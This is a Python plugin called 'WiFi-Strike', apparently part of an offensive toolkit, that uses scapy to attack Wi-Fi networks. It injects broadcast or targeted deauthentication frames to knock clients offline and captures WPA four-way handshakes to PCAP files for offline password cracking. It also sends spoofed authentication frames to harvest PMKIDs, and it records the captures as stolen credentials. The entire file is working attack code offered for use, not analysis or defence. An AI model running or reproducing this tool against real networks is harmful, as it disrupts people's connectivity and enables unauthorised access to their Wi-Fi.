from core.plugin_manager import BasePlugin
from scapy.all import (
    Dot11, Dot11Deauth, Dot11Auth, RadioTap, sendp, sniff,
    Dot11Beacon, EAPOL, wrpcap, Dot11ProbeReq, Dot11ProbeResp,
    Dot11AssoReq, Dot11AssoResp, RandMAC
)
import threading
import os
import time
from datetime import datetime

class WiFiAttackPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.interface = "Wi-Fi"
        self.handshakes = []
        self.deauth_targets = []
        self.threads = []
        self.capture_dir = "logs/captures"
        if not os.path.exists(self.capture_dir):
            os.makedirs(self.capture_dir, exist_ok=True)

    @property
    def name(self) -> str:
        return "WiFi-Strike"

    @property
    def description(self) -> str:
        return "Tactical Deauth & Handshake Capture"

    async def start(self, interface=None):
        from scapy.all import get_working_if
        self.interface = interface or get_working_if()
        self.running = True
        self.log_event(f"Wireless interface {self.interface} initialized", "READY")

    async def stop(self):
        self.running = False
        for t in self.threads:
            t.join(timeout=2)
        self.threads.clear()

    async def deauth(self, target_mac=None, ap_mac=None, count=100, reason=7):
        """
        Inject Deauthentication frames. Supports broadcast and targeted deauth.
        Reason codes: 1=unspecified, 4=disassoc_inactivity, 7=class3_from_nonassoc
        """
        if not target_mac and hasattr(self, 'target_store') and self.target_store.devices:
            target_mac = self.target_store.devices[0].get('mac', 'ff:ff:ff:ff:ff:ff')
            self.log_event(f"AUTO-TARGET: {target_mac}", "AUTO")

        if not ap_mac:
            ap_mac = "ff:ff:ff:ff:ff:ff"

        self.emit("INFO", {"msg": f"Deauth strike: {target_mac} via AP {ap_mac} (count={count}, reason={reason})"})

        try:
            # Build both directions for more effective deauth
            dot11_client = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
            dot11_ap = Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac)
            pkt_to_client = RadioTap() / dot11_client / Dot11Deauth(reason=reason)
            pkt_to_ap = RadioTap() / dot11_ap / Dot11Deauth(reason=reason)
        except Exception as e:
            self.emit("ERROR", {"msg": f"Frame construction failed: {e}"})
            return {"status": "Failed", "error": str(e)}

        def run_deauth():
            sent = 0
            try:
                for i in range(count):
                    if not self.running:
                        break
                    # Alternate between client and AP deauth for maximum disruption
                    sendp(pkt_to_client, iface=self.interface, verbose=False)
                    sendp(pkt_to_ap, iface=self.interface, verbose=False)
                    sent += 2
                    if i % 20 == 0 and i > 0:
                        self.emit("INFO", {"msg": f"Deauth burst: {sent} frames injected"})
                    time.sleep(0.05)
            except Exception as e:
                self.emit("ERROR", {"msg": f"Injection failed: {e} (monitor mode required on {self.interface})"})
            self.emit("SUCCESS", {"msg": f"Deauth complete: {sent} frames sent to {target_mac}"})

        t = threading.Thread(target=run_deauth, daemon=True)
        t.start()
        self.threads.append(t)
        return {"status": "Deauth sequence initiated", "target": target_mac, "count": count}

    async def capture_handshake(self, bssid, timeout=120):
        """
        Sniff for EAPOL (4-way handshake) packets for a specific BSSID.
        Saves complete handshake to PCAP file for offline cracking.
        """
        self.running = True
        captured = []
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_bssid = bssid.replace(':', '')
        pcap_path = os.path.join(self.capture_dir, f"handshake_{safe_bssid}_{ts}.pcap")
        all_packets_path = os.path.join(self.capture_dir, f"eapol_all_{safe_bssid}_{ts}.pcap")

        self.emit("INFO", {"msg": f"Listening for EAPOL from {bssid} (timeout: {timeout}s)"})

        def handle_pkt(pkt):
            # Capture EAPOL frames associated with target BSSID
            if EAPOL in pkt:
                # Check if this packet involves our target BSSID
                addrs = [getattr(pkt, f'addr{i}', None) for i in range(1, 4)]
                if bssid.lower() in [a.lower() for a in addrs if a]:
                    captured.append(pkt)
                    frame_num = len(captured)
                    self.emit("INFO", {"msg": f"EAPOL frame #{frame_num} captured from {bssid}"})

                    # Save incrementally so we don't lose data
                    try:
                        wrpcap(all_packets_path, captured)
                    except Exception:
                        pass

        def run_sniff():
            try:
                sniff(
                    iface=self.interface,
                    prn=handle_pkt,
                    lfilter=lambda p: EAPOL in p,
                    stop_filter=lambda x: len(captured) >= 4 or not self.running,
                    timeout=timeout
                )
            except Exception as e:
                self.emit("ERROR", {"msg": f"Capture failed: {e}"})

            if len(captured) >= 4:
                try:
                    wrpcap(pcap_path, captured)
                    self.handshakes.append({
                        "bssid": bssid,
                        "file": pcap_path,
                        "frames": len(captured),
                        "timestamp": ts
                    })
                    self.emit("SUCCESS", {"msg": f"Full handshake captured! Saved to {pcap_path} ({len(captured)} frames)"})
                    if hasattr(self, 'target_store'):
                        self.target_store.save_credential("WiFi-Strike", f"WPA Handshake: {bssid} -> {pcap_path}")
                except Exception as e:
                    self.emit("ERROR", {"msg": f"PCAP save failed: {e}"})
            elif captured:
                self.emit("INFO", {"msg": f"Partial capture: {len(captured)}/4 EAPOL frames from {bssid}. PCAP saved to {all_packets_path}"})
            else:
                self.emit("INFO", {"msg": f"No EAPOL frames captured from {bssid} within {timeout}s"})

        t = threading.Thread(target=run_sniff, daemon=True)
        t.start()
        self.threads.append(t)
        return {"status": "Handshake monitor active", "target": bssid, "pcap": pcap_path}

    async def pmkid_capture(self, bssid, timeout=30):
        """
        Attempt PMKID capture via association request.
        Faster than full 4-way handshake — works without client.
        """
        self.emit("INFO", {"msg": f"PMKID capture attempt on {bssid}"})
        captured_pmkid = []

        def handle_pmkid(pkt):
            if EAPOL in pkt:
                raw = bytes(pkt[EAPOL])
                # PMKID is in the first EAPOL message from AP (key type 0x8a)
                if len(raw) > 100:
                    pmkid = raw[-16:].hex()
                    captured_pmkid.append(pmkid)
                    self.emit("SUCCESS", {"msg": f"PMKID extracted: {pmkid[:16]}..."})

        def _run():
            try:
                # Send auth request to trigger PMKID response
                client_mac = str(RandMAC())
                auth_pkt = RadioTap() / Dot11(
                    addr1=bssid, addr2=client_mac, addr3=bssid
                ) / Dot11Auth(algo=0, seqnum=1, status=0)

                sendp(auth_pkt, iface=self.interface, verbose=False)
                sniff(iface=self.interface, prn=handle_pmkid,
                      lfilter=lambda p: EAPOL in p,
                      timeout=timeout)
            except Exception as e:
                self.emit("ERROR", {"msg": f"PMKID capture failed: {e}"})

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        self.threads.append(t)
        return {"status": "PMKID capture initiated", "bssid": bssid}

    def get_handshakes(self):
        return self.handshakes
